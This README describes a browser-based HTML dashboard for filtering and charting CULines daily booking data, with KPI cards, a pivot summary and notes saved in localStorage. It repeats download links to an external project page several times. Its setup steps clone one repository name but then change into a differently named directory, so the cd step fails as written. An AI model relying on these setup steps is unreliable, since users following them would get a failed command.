# Daily Booking Dashboard v2026 - CULines Booking Data Analysis

> **Daily Booking Dashboard is a browser-based HTML tool for analyzing CULines daily booking activity. Version 2026 combines filtering, KPI indicators, charts, pivot summaries, detail review, and locally saved notes in one workspace.**

[![Platform](https://img.shields.io/badge/Platform-HTML-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/logan-kingrn2505/daily-booking-kpi-dashboard?style=flat-square)](https://github.com/logan-kingrn2505/daily-booking-kpi-dashboard)

---

<p align="center">
  <a href="https://logan-kingrn2505.github.io/daily-booking-kpi-dashboard/">
    <img src="https://img.shields.io/badge/Download-Daily%20Booking%20Dashboard%20Latest-brightgreen?style=for-the-badge" alt="Download Daily Booking Dashboard">
  </a>
</p>

> **[Download Daily Booking Dashboard v2026](https://logan-kingrn2505.github.io/daily-booking-kpi-dashboard/)**

---

[Download Latest Build](https://logan-kingrn2505.github.io/daily-booking-kpi-dashboard/)

---

## Overview

Daily Booking Dashboard provides a local, browser-based way to examine CULines daily booking data. It brings common review tasks into a single interface so you can filter and compare booking activity without moving between multiple spreadsheets or reporting screens.

The dashboard is built for quick inspection of daily records. KPI cards, visual charts, a pivot-oriented summary, and a detailed data table support both high-level monitoring and row-by-row checking. Notes are stored through browser `localStorage`, allowing observations to remain available during future review sessions in the same browser.

---

## What It Includes

- Narrow results by multiple lanes or lane groups
- Find booking records with a CUL code search
- Analyze records using POL/DEL origin and destination terms
- View operational snapshots through KPI cards
- Group booking information in a summary pivot table
- Explore trends and distributions with Chart.js visualizations
- Compare individual records in the detailed table
- Preserve custom observations with `localStorage` note storage

---

## Getting Started

1. Download or clone the repository:
   ```bash
   git clone https://github.com/logan-kingrn2505/daily-booking-kpi-dashboard.git
   ```

2. Move into the project directory:
   ```bash
   cd daily-booking-dashboard
   ```

3. Open the HTML dashboard in a modern browser, or run the files through any static web server.

When using a local server, open the dashboard's main HTML page once the server is running.

---

## Using the Dashboard

1. Bring your daily booking data into the dashboard workflow.
2. Filter the data by lane, CUL code, or POL/DEL values.
3. Use the KPI cards and charts to identify changes, peaks, and distribution patterns.
4. Compare grouped results in the pivot summary.
5. Confirm individual entries in the detail table.
6. Record useful context in the notes area for later reference.

A typical review might look like this:

- Enter a CUL code to focus on one shipment group
- Narrow the results further with POL/DEL search terms
- Compare grouped totals in the pivot summary
- Review chart results for visible trends
- Save observations in the browser for the next review

---

## Browser Storage and Configuration

The dashboard stores settings and notes in the browser's `localStorage`.

Stored information may include:

- Selected filter values
- Note text
- The most recently used view state, where supported by the current browser session

To remove saved dashboard data, clear the site's storage through your browser settings.

---

## Requirements

- A modern browser that supports HTML5
- JavaScript enabled in the browser
- Chart.js available to the dashboard runtime
- Sufficient browser storage for notes and saved state
- Excel-exported or spreadsheet-based booking data when preparing input through that workflow

---

## Frequently Asked Questions

**How can I install a newer dashboard build?**  
Replace the local project files with the latest build from the project download location, then open the HTML dashboard again.

**Why did my saved notes disappear?**  
Notes are kept in `localStorage` within the current browser profile. Clearing browser storage removes those notes, so they cannot be restored by the dashboard.

**Will my notes and preferences follow me to another computer?**  
No automatic transfer is provided. Move any required data separately and re-enter or export your notes as needed on the other machine.

**What can I check when the filters or charts fail to load?**  
Confirm that you opened the correct HTML entry point, verify that JavaScript is enabled, and use a browser with the required feature support.

**Where does the dashboard keep configuration changes?**  
Unless you add an external storage process, configuration changes are saved in the browser using `localStorage`.

---

## License

This project is released under the GNU GPL v3.0. Refer to [LICENSE](LICENSE) for the full license details.
